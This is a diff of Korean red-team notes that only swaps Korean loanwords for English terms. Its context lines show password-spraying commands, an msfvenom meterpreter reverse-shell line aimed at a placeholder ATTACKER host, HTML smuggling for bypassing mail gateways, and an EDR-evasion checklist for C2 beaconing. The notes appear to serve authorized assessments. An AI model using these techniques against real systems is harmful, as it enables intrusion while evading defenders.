@@ -8,12 +8,12 @@
 
 ## Password Spray
 
-계정 잠금(lockout)을 피하기 위해 하나의 패스워드를 여러 계정에 시도하는 기법.
+계정 잠금(lockout)을 피하기 위해 하나의 password를 여러 계정에 시도하는 기법.
 
-**반드시 패스워드 정책(lockout threshold, observation window)을 먼저 확인한다.**
+**반드시 password 정책(lockout threshold, observation window)을 먼저 확인한다.**
 
 ```bash
-# 패스워드 정책 확인
+# password 정책 확인
 nxc ldap <ip> -u '' -p '' --pass-pol
 # 또는
 rpcclient -N -U '' <ip> -c 'getdompwinfo'
@@ -83,7 +83,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=443 -f vba-
 
 ### HTML Smuggling
 
-JavaScript로 바이너리를 HTML 내부에 Base64로 임베딩하여 브라우저에서 재조립. 이메일 게이트웨이/프록시 우회에 효과적.
+JavaScript로 binary를 HTML 내부에 Base64로 임베딩하여 브라우저에서 재조립. 이메일 게이트웨이/proxy 우회에 효과적.
 
 ```html
 <html>
@@ -254,7 +254,7 @@ ffuf -u <url>/login -X POST \
     1. VDI/Citrix session 크리덴셜
     2. 실제 도메인 가입 Windows 노트북 + 일반 직원 권한 계정
     3. VPN 계정 + 내부 네트워크 접근권
-- EDR/AV/프록시/Proxy Auth/Conditional Access 등 **실제 직원과 동일한 보안 통제** 적용
+- EDR/AV/proxy/Proxy Auth/Conditional Access 등 **실제 직원과 동일한 보안 통제** 적용
 
 ### 평가 범위
 
@@ -271,11 +271,11 @@ ffuf -u <url>/login -X POST \
 
 - [ ] 제공받은 endpoint에서 **첫 Beacon 전까지** 로컬 정찰 최소화 (Defender/EDR 초기 관찰 윈도우 회피)
 - [ ] C2 통신은 Jitter + Sleep 60~180s 이상, 업무시간 내 전송
-- [ ] LDAP 정찰은 `-LoopDetection` / `ServicePrincipalName` 등 **빈도 낮은 속성** 중심, 단일 session에서 전체 도메인 덤프 지양
-- [ ] 티켓/해시 획득 후 24h 내 Tier 0 진입 시도는 대부분 탐지됨 → 며칠 간 정찰만 수행 후 이동
+- [ ] LDAP 정찰은 `-LoopDetection` / `ServicePrincipalName` 등 **빈도 낮은 속성** 중심, 단일 session에서 전체 도메인 dump 지양
+- [ ] 티켓/hash 획득 후 24h 내 Tier 0 진입 시도는 대부분 탐지됨 → 며칠 간 정찰만 수행 후 이동
 - [ ] 최종 미션 수행 직전, 블루팀에게 사전 고지(High-Impact Only Card)
 
 ### 참고
 
-- 라이프사이클 정의: [레드팀이란 (xn--hy1b43d247a.com)](https://www.xn--hy1b43d247a.com/what-even-is-redteam)
+- lifecycle 정의: [레드팀이란 (xn--hy1b43d247a.com)](https://www.xn--hy1b43d247a.com/what-even-is-redteam)
 - TIBER-EU Framework: <https://www.ecb.europa.eu/paym/cyber-resilience/tiber-eu/html/index.en.html>
